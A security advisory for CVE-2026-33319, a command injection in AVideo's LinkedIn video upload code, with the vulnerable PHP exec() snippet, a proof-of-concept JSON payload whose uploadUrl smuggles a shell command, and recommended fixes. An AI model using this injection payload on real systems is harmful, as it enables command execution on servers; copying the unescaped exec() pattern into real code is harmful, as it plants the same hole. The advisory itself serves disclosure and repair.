# [M] AVideo has an OS Command Injection via Unescaped URL in LinkedIn Video Upload Shell Command

## Summary
Severity: Medium
Advisory: GHSA-w5ff-2mjc-4phc
CVE: CVE-2026-33319
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-w5ff-2mjc-4phc
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `uploadVideoToLinkedIn()` method in the SocialMediaPublisher plugin constructs a shell command by directly interpolating an upload URL received from LinkedIn's API response, without sanitization via `escapeshellarg()`. If an attacker can influence the LinkedIn API response (via MITM, compromised OAuth token, or API compromise), they can inject arbitrary OS commands that execute as the web server user.

## Details

The vulnerability exists in `plugin/SocialMediaPublisher/Objects/SocialUploader.php`.

The `initializeLinkedInUploadSession()` method (line 649) sends a POST request to `https://api.linkedin.com/rest/videos?action=initializeUpload` and parses the JSON response at line 693:

```php
// SocialUploader.php:693
$responseArray = json_decode($response, true);
```

The parsed `uploadInstructions` array is iterated at line 532, and each `uploadUrl` is passed to `uploadVideoToLinkedIn()` at line 542:

```php
// SocialUploader.php:542
$uploadResponse = self::uploadVideoToLinkedIn($instruction['uploadUrl'], $tmpFile);
```

The `uploadVideoToLinkedIn()` method (line 711) constructs a shell command by directly concatenating both `$uploadUrl` and `$filePath` into a string passed to `exec()`:

```php
// SocialUploader.php:713-720
$shellCmd = 'curl -v -H "Content-Type:application/octet-stream" --upload-file "' .
    $filePath . '" "' .
    $uploadUrl . '" 2>&1';

_error_log("Upload Video Shell Command:\n" . $shellCmd);

exec($shellCmd, $o);
```

Neither `$uploadUrl` nor `$filePath` is sanitized with `escapeshellarg()`. A malicious URL such as `https://uploads.linkedin.local" ; id ; echo "` would break out of the quoted string and execute arbitrary commands.

The `$uploadUrl` originates from LinkedIn's API response — a trusted third-party source over HTTPS — so exploitation requires compromising that response (MITM at CA level, compromised OAuth token leading to attacker-controlled API responses, or LinkedIn API compromise). This makes the attack complexity high, but the missing sanitization is a defense-in-depth failure that could become critical if the trust boundary is ever violated.

## PoC

This vulnerability requires manipulating the LinkedIn API response. A simulated proof-of-concept using a local proxy:

**Step 1:** Set up a proxy that intercepts the LinkedIn API response and replaces the `uploadUrl` field:

```json
{
  "value": {
    "uploadInstructions": [
      {
        "uploadUrl": "https://example.com\" ; id > /tmp/pwned ; echo \"",
        "firstByte": 0,
        "lastByte": 1024
      }
    ],
    "uploadToken": "token123",
    "video": "urn:li:video:123"
  }
}
```

**Step 2:** The resulting shell command becomes:

```bash
curl -v -H "Content-Type:application/octet-stream" --upload-file "/tmp/tmpfile" "https://uploads.linkedin.local" ; id > /tmp/pwned ; echo "" 2>&1
```

**Step 3:** The `id` command executes as the web server user, writing output to `/tmp/pwned`.

**Step 4:** Verify:

```bash
cat /tmp/pwned
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Impact

- **Remote Code Execution:** If the LinkedIn API response is compromised, an attacker gains arbitrary command execution as the web server user (`www-data`).
- **Confidentiality:** Full read access to application source code, configuration files (including database credentials), and any data accessible to the web server process.
- **Integrity:** Ability to modify application files, inject backdoors, or alter database records.
- **Practical risk is low** due to the high attack complexity — exploitation requires compromising a trusted HTTPS API response from LinkedIn. This is primarily a defense-in-depth issue.

## Recommended Fix

Sanitize both `$uploadUrl` and `$filePath` with `escapeshellarg()` before interpolation into the shell command. Alternatively, replace the `exec()` call with PHP's native cURL functions (which are already used elsewhere in the same class):

**Option 1 — Minimal fix with `escapeshellarg()`:**

```php
// plugin/SocialMediaPublisher/Objects/SocialUploader.php:711-715
static function uploadVideoToLinkedIn($uploadUrl, $filePath)
{
    $shellCmd = 'curl -v -H "Content-Type:application/octet-stream" --upload-file ' .
        escapeshellarg($filePath) . ' ' .
        escapeshellarg($uploadUrl) . ' 2>&1';
```

**Option 2 — Replace shell exec with native PHP cURL (preferred):**

```php
static function uploadVideoToLinkedIn($uploadUrl, $filePath)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $uploadUrl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/octet-stream']);
    curl_setopt($ch, CURLOPT_PUT, true);
    curl_setopt($ch, CURLOPT_INFILE, fopen($filePath, 'r'));
    curl_setopt($ch, CURLOPT_INFILESIZE, filesize($filePath));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_VERBOSE, true);

    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);

    // Extract ETag from response headers
    $matches = [];
    preg_match('/(etag:)(\s?)(.*)(\n)/i', $headers, $matches);
    $etag = isset($matches[3]) ? trim($matches[3]) : null;

    // ... rest of function
}
```

Option 2 is strongly preferred as it eliminates the shell execution entirely, removing the injection surface and aligning with the PHP cURL usage already present in `initializeLinkedInUploadSession()` on line 664.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-w5ff-2mjc-4phc
- https://nvd.nist.gov/vuln/detail/CVE-2026-33319
- https://github.com/WWBN/AVideo/commit/67d932eb05e1bc9b36796f73ff4f9fb47590598b
- https://github.com/WWBN/AVideo
